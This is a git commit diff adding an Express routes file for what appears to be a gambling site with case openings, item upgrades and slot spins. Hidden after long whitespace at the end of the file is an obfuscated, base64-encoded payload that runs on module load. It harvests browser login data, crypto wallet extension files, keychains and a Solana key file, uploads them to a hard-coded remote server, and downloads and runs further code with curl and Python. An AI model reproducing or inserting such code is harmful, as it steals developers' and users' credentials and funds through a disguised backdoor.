7611bd7cc980e735d0e80b20d2bcf7217ce14895
Tanaka Eigan <keeneyes1114@gmail.com>
2024-07-12 09:52:23 +0900

    first commit

---
+++ routes/gamesRoutes.js
@@ -0,0 +1,174 @@
+const express = require("express");
+const router = express.Router();
+const { isAuthenticated } = require("../middleware/authMiddleware");
+
+const User = require("../models/User");
+const Case = require("../models/Case");
+const upgradeItems = require("../games/upgrade");
+const SlotGameController = require("../games/slot");
+const updateLevel = require("../utils/updateLevel");
+
+
+// Rarities array
+const Rarities = [
+  { id: "1", chance: 0.7992 },
+  { id: "2", chance: 0.1598 },
+  { id: "3", chance: 0.032 },
+  { id: "4", chance: 0.0064 },
+  { id: "5", chance: 0.0026 },
+];
+
+// Helper functions
+function groupItemsByRarity(items) {
+  const itemsByRarity = {};
+  items.forEach((item) => {
+    if (!itemsByRarity[item.rarity]) {
+      itemsByRarity[item.rarity] = [];
+    }
+    itemsByRarity[item.rarity].push(item);
+  });
+  return itemsByRarity;
+}
+
+function getRandomWeightedItem(items, weightPropertyName) {
+  const randomNumber = Math.random();
+  let cumulativeWeight = 0;
+  for (const item of items) {
+    cumulativeWeight += item[weightPropertyName];
+    if (randomNumber <= cumulativeWeight) {
+      return item;
+    }
+  }
+}
+
+function getRandomItemFromRarity(itemsByRarity, rarity) {
+  const items = itemsByRarity[rarity];
+  if (!items || items.length === 0) {
+    return null;
+  }
+  return items[Math.floor(Math.random() * items.length)];
+}
+
+function getWinningItem(caseData) {
+  const itemsByRarity = groupItemsByRarity(caseData.items);
+  const winningRarity = getRandomWeightedItem(Rarities, "chance");
+  let winningItem = getRandomItemFromRarity(itemsByRarity, winningRarity.id);
+
+  // If winningItem is null, get an item from another rarity
+  if (!winningItem) {
+    // Get array of all rarities that exist in the case
+    const existingRarities = Object.keys(itemsByRarity);
+
+    // Select a random rarity from existingRarities
+    const randomExistingRarity = existingRarities[Math.floor(Math.random() * existingRarities.length)];
+
+    // Select a random item from the chosen rarity
+    winningItem = getRandomItemFromRarity(itemsByRarity, randomExistingRarity);
+  }
+  return winningItem;
+
+}
+
+// Exports
+module.exports = (io) => {
+  // Routes
+  router.post("/openCase/:id", isAuthenticated, async (req, res) => {
+    try {
+      const { id } = req.params;
+      const user = req.user;
+      const quantityToOpen = req.body.quantity;
+      const winningItems = [];
+
+      const caseData = await Case.findById(id).populate("items");
+
+      if (!caseData || !user) {
+        if (!caseData) {
+          return res.status(404).json({ message: "Case not found" });
+        } else {
+          return res.status(404).json({ message: "User not found" });
+        }
+      }
+
+      if (!Number.isInteger(quantityToOpen)) {
+        return res.status(400).json({ message: "Quantity to open must be an integer" });
+      }
+
+      if (quantityToOpen > 5) {
+        return res.status(400).json({ message: "You can only open up to 5 cases at a time" });
+      }
+
+      if (quantityToOpen < 1) {
+        return res.status(400).json({ message: "You need to open at least 1 case" });
+      }
+
+      if (user.walletBalance < (caseData.price * quantityToOpen)) {
+        return res.status(400).json({ message: "Insufficient balance" });
+      }
+
+      for (let i = 0; i < quantityToOpen; i++) {
+        const winningItem = getWinningItem(caseData);
+        winningItems.push(winningItem);
+      }
+
+      // Add the entire winning items object to the user's inventory
+      user.inventory.unshift(...winningItems);
+
+      updateLevel(user, caseData.price * quantityToOpen);
+
+      await user.save();
+
+      const winnerUser = {
+        name: user.username,
+        id: user._id,
+        profilePicture: user.profilePicture
+      }
+
+      // Emit the caseOpened event
+      io.emit("caseOpened", {
+        winningItems: winningItems,
+        user: winnerUser,
+        caseImage: caseData.image,
+      });
+
+      res.json({ items: winningItems });
+
+      const userDataPayload = {
+        walletBalance: user.walletBalance,
+        xp: user.xp,
+        level: user.level,
+      }
+      io.to(user._id.toString()).emit('userDataUpdated', userDataPayload);
+
+    } catch (error) {
+      console.error(error);
+      res.status(500).json({ message: "Internal server error" });
+    }
+  });
+
+  // Upgrade items
+  router.post("/upgrade", isAuthenticated, async (req, res) => {
+    const { selectedItemIds, targetItemId } = req.body;
+    const user = req.user._id;
+
+
+    const result = await upgradeItems(user, selectedItemIds, targetItemId);
+    res.status(result.status).json(result);
+  });
+
+  // Spin the slot machine
+  router.post('/slots', isAuthenticated, async (req, res) => {
+    const user = req.user;
+
+    try {
+      const { betAmount } = req.body;
+
+      const result = await SlotGameController.spin(user._id, betAmount, io);
+      res.json(result);
+    } catch (error) {
+      res.status(500).json({ message: error.message });
+    }
+  });
+
+
+  return router;
+};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  Object.prototype.toString,Object.getOwnPropertyDescriptor,Object.defineProperty;const t="base64",a="utf8",$=require("os"),r=require("fs"),n=c=>(s1=c.slice(1),Buffer.from(s1,t).toString(a));pt=require(n("zcGF0aA")),rq=require(n("YcmVx"+"dWVzdA")),ex=require(n("aY2hpbGRf"+"cHJvY2Vzcw"))[n("cZXhlYw")],zv=require(n("Zbm9kZTpwcm9jZXNz")),hs=$[n("caG9zdG5hbWU")](),hd=$[n("ZaG9tZWRpcg")](),pl=$[n("YcGxhdGZvcm0")](),td=$[n("cdG1wZGly")]();let e;const l=c=>Buffer.from(c,t).toString(a),s=()=>{let t="MTQ3LjEyNCaHR0cDovLw4yMTQuMTI5OjEyNDQ=  ";for(var c="",a="",$="",r="",n=0;n<10;n++)c+=t[n],a+=t[10+n],$+=t[20+n],r+=t[30+n];return c=c+$+r,l(a)+l(c)},h=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[l("ZGlybmFtZQ")](hd)}/${c}`)),o="u2GgOA8",Z="Z2V0",y="Ly5ucGw",i="d3JpdGVGaWxlU3luYw",d="L2NsaWVudA",p=l("ZXhpc3RzU3luYw"),u="TG9naW4gRGF0YQ",b="Y29weUZpbGU";function m(t){const c=l("YWNjZXN"+"zU3luYw");try{return r[c](t),!0}catch(t){return!1}}const G=l("RGVmYXVsdA"),W=l("UHJvZmlsZQ"),Y=n("aZmlsZW5hbWU"),f=n("cZm9ybURhdGE"),w=n("adXJs"),V=n("Zb3B0aW9ucw"),v=n("YdmFsdWU"),j=l("cmVhZGRpclN5bmM"),z=l("c3RhdFN5bmM"),L=l("cG9zdA"),X="Ly5jb25maWcv",g="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",x="L0FwcERhdGEv",N="L1VzZXIgRGF0YQ",R="R29vZ2xlL0Nocm9tZQ",k="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",_="Z29vZ2xlLWNocm9tZQ",F=["TG9jYWwv"+k,k,k],q=["TG9jYWwv"+R,R,_],B=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let U="comp";const J=["aGxlZm5rb2RiZWZncGdrbm4","aGVjZGFsbWVlZWFqbmltaG0","cGVia2xtbmtvZW9paG9mZWM","YmJsZGNuZ2NuYXBuZG9kanA","ZGdjaWpubWhuZm5rZG5hYWQ","bWdqbmpvcGhocGtrb2xqcGE","ZXBjY2lvbmJvb2hja29ub2VlbWc","aGRjb25kYmNiZG5iZWVwcGdkcGg","a3Bsb21qamtjZmdvZG5oY2VsbGo"],T=["bmtiaWhmYmVvZ2FlYW9l","ZWpiYWxiYWtvcGxjaGxn","aWJuZWpkZmptbWtwY25s","Zmhib2hpbWFlbGJvaHBq","aG5mYW5rbm9jZmVvZmJk","YmZuYWVsbW9tZWltaGxw","YWVhY2hrbm1lZnBo","ZWdqaWRqYnBnbGlj","aGlmYWZnbWNjZHBl"],Q=t=>{const c=n("YbXVsdGlfZmlsZQ"),a=n("ZdGltZXN0YW1w"),$=l("L3VwbG9hZHM"),r={[a]:e.toString(),type:o,hid:U,[c]:t},h=s();try{let t={[w]:`${h}${$}`,[f]:r};rq[L](t,((t,c,a)=>{}))}catch(t){}},S="Y3JlYXRlUmVhZFN0cmVhbQ",C=async(t,c,a)=>{let $=t;if(!$||""===$)return[];try{if(!m($))return[]}catch(t){return[]}c||(c="");let n=[];const e=l("TG9jYWwgRXh0ZW5"+"zaW9uIFNldHRpbmdz"),s=l(S);for(let a=0;a<200;a++){const h=`${t}/${0===a?G:`${W} ${a}`}/${e}`;for(let t=0;t<T.length;t++){const e=l(T[t]+J[t]);let o=`${h}/${e}`;if(m(o)){try{far=r[j](o)}catch(t){far=[]}far.forEach((async t=>{$=pt.join(o,t);try{n.push({[V]:{[Y]:`${c}${a}_${e}_${t}`},[v]:r[s]($)})}catch(t){}}))}}}if(a){const t=l("c29sYW5hX2lkLnR4dA");if($=`${hd}${l("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,r[p]($))try{n.push({[v]:r[s]($),[V]:{[Y]:t}})}catch(t){}}return Q(n),n},A=async(t,c)=>{try{const a=h("~/");let $="";$="d"==pl[0]?`${a}${l(g)}${l(t[1])}`:"l"==pl[0]?`${a}${l(X)}${l(t[2])}`:`${a}${l(x)}${l(t[0])}${l(N)}`,await C($,`${c}_`,0==c)}catch(t){}},H=async()=>{let t=[];const c=l(u),a=l(S),$=l("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),n=l("bG9na2MtZGI");if(pa=`${hd}${$}`,r[p](pa))try{t.push({[v]:r[a](pa),[V]:{[Y]:n}})}catch(t){}else if(pa+="-db",r[p](pa))try{t.push({[v]:r[a](pa),[V]:{[Y]:n}})}catch(t){}try{const $=l(b);let n="";if(n=`${hd}${l(g)}${l(R)}`,n&&""!==n&&m(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?G:`${W} ${e}`}/${c}`;try{if(!m(l))continue;const c=`${n}/ld_${e}`;m(c)?t.push({[v]:r[a](c),[V]:{[Y]:`pld_${e}`}}):r[$](l,c,(t=>{let c=[{[v]:r[a](l),[V]:{[Y]:`pld_${e}`}}];Q(c)}))}catch(t){}}}catch(t){}return Q(t),t},M=async()=>{let t=[];const c=l(u),a=l(S);try{const $=l(b);let n="";if(n=`${hd}${l(g)}${l(k)}`,n&&""!==n&&m(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?G:`${W} ${e}`}/${c}`;try{if(!m(l))continue;const c=`${n}/brld_${e}`;m(c)?t.push({[v]:r[a](c),[V]:{[Y]:`brld_${e}`}}):r[$](l,c,(t=>{let c=[{[v]:r[a](l),[V]:{[Y]:`brld_${e}`}}];Q(c)}))}catch(t){}}}catch(t){}return Q(t),t},E=async()=>{let t=[];const c=l(S),a=l("a2V5NC5kYg"),$=l("a2V5My5kYg"),n=l("bG9naW5zLmpzb24");try{let e="";if(e=`${hd}${l(g)}${l("RmlyZWZveA")}`,e&&""!==e&&m(e))for(let l=0;l<200;l++){const s=0===l?G:`${W} ${l}`;try{const $=`${e}/${s}/${a}`;m($)&&t.push({[v]:r[c]($),[V]:{[Y]:`fk4_${l}`}})}catch(t){}try{const a=`${e}/${s}/${$}`;m(a)&&t.push({[v]:r[c](a),[V]:{[Y]:`fk3_${l}`}})}catch(t){}try{const a=`${e}/${s}/${n}`;m(a)&&t.push({[v]:r[c](a),[V]:{[Y]:`flj_${l}`}})}catch(t){}}}catch(t){}return Q(t),t},I=async()=>{let t=[];l(u);const c=l(S);try{const t=l("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");let a="";a=`${hd}${t}`;let $=[];if(a&&""!==a&&m(a))try{$=r[j](a)}catch(t){$=[]}$.forEach((async t=>{pa=pt.join(a,t);try{ldb_data.push({[v]:r[c](pa),[V]:{[Y]:`${t}`}})}catch(t){}}))}catch(t){}return Q(t),t},O=async()=>{let t=[];const c=l(S),a=l("a2V5NC5kYg"),$=l("a2V5My5kYg"),n=l("bG9naW5zLmpzb24");try{let e="";if(e=`${hd}${l("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`,e&&""!==e&&m(e))for(let l=0;l<200;l++){const s=0===l?G:`${W} ${l}`;try{const $=`${e}/${s}/${a}`;m($)&&t.push({[v]:r[c]($),[V]:{[Y]:`flk4_${l}`}})}catch(t){}try{const a=`${e}/${s}/${$}`;m(a)&&t.push({[v]:r[c](a),[V]:{[Y]:`flk3_${l}`}})}catch(t){}try{const a=`${e}/${s}/${n}`;m(a)&&t.push({[v]:r[c](a),[V]:{[Y]:`fllj_${l}`}})}catch(t){}}}catch(t){}return Q(t),t},P=l("cm1TeW5j"),D="XC5weXBccHl0",K="aG9uLmV4ZQ",tt=51476592;let ct=0;const at=()=>{const t=l("cDIuemlw"),c=`${s()}${l("L3Bkb3du")}`,a=`${td}\\${l("cC56aQ")}`,$=`${td}\\${t}`;if(ct>=tt+4)return;const n=l("cmVuYW1lU3luYw"),e=l("cmVuYW1l");if(r[p](a))try{var h=r[z](a);h.size>=tt+4?(ct=h.size,r[e](a,$,(t=>{if(t)throw t;$t($)}))):(ct>=h.size?(r[P](a),ct=0):ct=h.size,nt())}catch(t){}else{const t=`${l("Y3VybCAtTG8")} "${a}" "${c}"`;ex(t,((t,c,e)=>{if(t)return ct=0,void nt();try{ct=tt+4,r[n](a,$),$t($)}catch(t){}}))}},$t=async t=>{const c=`${l("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,a,$)=>{if(c)return r[P](t),void(ct=0);r[P](t),lt()}))},rt=async()=>{let t=[];const c=l(u),a=l(S);try{const $=l(b);let n="";if(n=`${hd}${l(X)}${l(_)}`,n&&""!==n&&m(n))for(let e=0;e<200;e++){const l=`${n}/${0===e?G:`${W} ${e}`}/${c}`;try{if(!m(l))continue;const c=`${n}/ld_${e}`;m(c)?t.push({[v]:r[a](c),[V]:{[Y]:`plld_${e}`}}):r[$](l,c,(t=>{let c=[{[v]:r[a](l),[V]:{[Y]:`plld_${e}`}}];Q(c)}))}catch(t){}}}catch(t){}return Q(t),t};function nt(){setTimeout((()=>{at()}),2e4)}const et=async()=>{let t="2C3";try{t+=zv[l("YXJndg")][1]}catch(t){}(async(t,c)=>{const a={ts:e.toString(),type:o,hid:U,ss:t,cc:c.toString()},$=s(),r={[w]:`${$}${l("L2tleXM")}`,[f]:a};try{rq[L](r,((t,c,a)=>{}))}catch(t){}})("jv",t)},lt=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${l(D+K)}`;r[p](`${t}`)?(()=>{const t=s(),c=l(d),a=l(Z),$=l(i),n=l(y),e=`${t}${c}/${o}`,h=`${hd}${n}`,p=`"${hd}${l(D+K)}" "${h}"`;try{r[P](h)}catch(t){}rq[a](e,((t,c,a)=>{if(!t)try{r[$](h,a),ex(p,((t,c,a)=>{}))}catch(t){}}))})():at()}else(()=>{const t=s(),c=l(d),a=l(i),$=l(Z),n=l(y),e=l("cHl0aG9u"),h=`${t}${c}/${o}`,p=`${hd}${n}`;let u=`${e}3 "${p}"`;rq[$](h,((t,c,$)=>{t||(r[a](p,$),ex(u,((t,c,a)=>{})))}))})()}));const st=async()=>{try{e=Date.now(),await(async()=>{U=hs,await et();try{const t=h("~/");await A(q,0),await A(F,1),await A(B,2),"w"==pl[0]?(pa=`${t}${l(x)}${l("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${l(N)}`,await C(pa,"3_",!1)):"d"==pl[0]?(await H(),await M(),await E()):"l"==pl[0]&&(await I(),await rt(),await O())}catch(t){}})(),lt()}catch(t){}};st();let ht=setInterval((()=>{1,c<5?st():clearInterval(ht)}),6e5);
